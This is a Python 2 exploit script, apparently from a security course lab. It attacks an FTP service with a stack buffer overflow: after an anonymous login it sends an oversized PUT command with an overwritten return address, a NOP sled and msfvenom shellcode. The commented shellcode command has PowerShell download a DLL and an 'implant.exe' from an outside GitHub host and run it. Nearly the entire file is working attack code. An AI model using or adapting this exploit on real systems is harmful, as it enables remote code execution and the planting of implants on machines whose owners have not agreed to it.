import socket

TARGET_IP = "10.0.0.61"
TARGET_PORT = 21

i = 2008

#eip = "BBBB"
#eip = "\x0d\x41\x43\x00"
eip = "\x4f\xf4\xe9\x75"
nop_sled = "\x90" * 10


# msfvenom -f python -p windows/exec CMD="powershell.exe mkdir ..\dll ; cd ..\dll ; wget https://github.com/spencerroth3/CSEC-659/raw/main/DLLInjection/dll/mydll.dll -O mydll.dll ; cd ..\Desktop ; wget https://github.com/spencerroth3/CSEC-659/raw/main/DLLInjection/implant.exe -O implant.exe ; .\implant.exe" -b "\x00\x0a\x0d\x20" -a x86
buf =  b""
buf += b"\xdb\xc4\xba\x8d\xe3\xdb\xcb\xd9\x74\x24\xf4\x5b\x31"
buf += b"\xc9\xb1\x71\x31\x53\x19\x83\xc3\x04\x03\x53\x15\x6f"
buf += b"\x16\x27\x23\xed\xd9\xd8\xb4\x91\x50\x3d\x85\x91\x07"
buf += b"\x35\xb6\x21\x43\x1b\x3b\xca\x01\x88\xc8\xbe\x8d\xbf"
buf += b"\x79\x74\xe8\x8e\x7a\x24\xc8\x91\xf8\x36\x1d\x72\xc0"
buf += b"\xf9\x50\x73\x05\xe7\x99\x21\xde\x6c\x0f\xd6\x6b\x38"
buf += b"\x8c\x5d\x27\xad\x94\x82\xf0\xcc\xb5\x14\x8a\x97\x15"
buf += b"\x96\x5f\xac\x1f\x80\xbc\x88\xd6\x3b\x76\x67\xe9\xed"
buf += b"\x46\x88\x46\xd0\x66\x7b\x96\x14\x40\x63\xed\x6c\xb2"
buf += b"\x1e\xf6\xaa\xc8\xc4\x73\x29\x6a\x8f\x24\x95\x8a\x5c"
buf += b"\xb2\x5e\x80\x29\xb0\x39\x85\xac\x15\x32\xb1\x25\x98"
buf += b"\x95\x33\x7d\xbf\x31\x1f\x26\xde\x60\xc5\x89\xdf\x73"
buf += b"\xa6\x76\x7a\xff\x4b\x63\xf7\xa2\x01\x72\x85\xd8\x64"
buf += b"\x74\x95\xe2\xd8\x1c\xa4\x69\xb7\x5b\x39\xb8\xf3\x93"
buf += b"\x73\xe1\x52\x3b\xda\x73\xe7\x26\xdd\xa9\x24\x5e\x5e"
buf += b"\x58\xd5\xa5\x7e\x29\xd0\xe2\x38\xc1\xa8\x7b\xad\xe5"
buf += b"\x1f\x7c\xe4\x96\xf0\xf5\x62\x25\x7c\x91\x09\xa5\xee"
buf += b"\x4f\xb7\x4d\x8a\xaf\x5a\xc5\x30\xc6\xd6\x39\x97\x36"
buf += b"\x4b\x5e\x8b\x2a\x53\xa5\x73\xd1\xf7\xf9\x5d\x3b\xa4"
buf += b"\x9d\xcd\x2f\x74\x65\x2e\xd8\x13\xfc\x5a\x06\xb4\x8a"
buf += b"\xd6\x36\x37\x49\x38\x99\xd0\xc4\x32\x8d\x6b\x75\x95"
buf += b"\x2e\xfb\x14\xc6\xc3\x73\x82\x76\x40\x11\x3e\xf5\xe9"
buf += b"\xad\xd6\xca\xda\x0e\x74\x68\x67\xbc\x4c\x47\x5e\x91"
buf += b"\xc2\xc6\xd7\xc2\x4f\x68\x7e\x73\xbf\x2e\xcc\xc7\xf6"
buf += b"\xc0\xa6\xb2\x6b\x69\x5f\x52\x02\xbe\xfb\xc0\xb6\xef"
buf += b"\x6e\x60\x23\x9c\x1c\xbc\xcf\x30\xb0\xe0\x22\x86\x68"
buf += b"\x8c\x45\x7c\x04\x22\x98\x18\xb8\xd6\xc4\xdb\x60\x44"
buf += b"\x61\x3c\x4e\xa4\x35\x78\xeb\xcb\xae\xf4\x9c\x5b\x11"
buf += b"\xce\x42\xeb\x36\x55\xf6\x33\xd1\xe1\x82\x43\x52\x30"
buf += b"\x45\x8b\xf3\x2d\xed\xbb\x8e\xcf\x23\x5f\x1e\x7d\x14"
buf += b"\xec\x90\x18\x04\x71\x34\x91\xaa\x1a\xc2\x3d\x79\xca"
buf += b"\x69\xed\x38\x57\x43\x27\xf7\x6e\xb4\x35\x96\xe7\xe5"
buf += b"\xd4\x39\x61\x94\x09\xfd\x3d\x24\x1f\x93\xd7\xd1\xfc"
buf += b"\x1f\x41\x75\x6d\xf0\xf8\xe4\x01\x62\x9a\x98\x95\x54"
buf += b"\x39\x1d\x33\x88\xec\x92\x9b\xa1\x83\x5c\xb0\x50\x32"
buf += b"\xe9\x66\xf7\xb2\x74\x57\xcc\x62\x59\xcb\x5b\x0e\xd5"
buf += b"\x9f\xfa\xbe\x61\x4e\x99\x46\xef\x8e"


payload = "PUT " + "A" * i + eip + nop_sled + buf + "\r\n"
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((TARGET_IP, TARGET_PORT))
sock.send('USER anonymous\r\n')
print sock.recv(1024)
sock.send('PASS anonymous\r\n')
print sock.recv(1024)
sock.send(payload)
print sock.recv(1024)
sock.close()
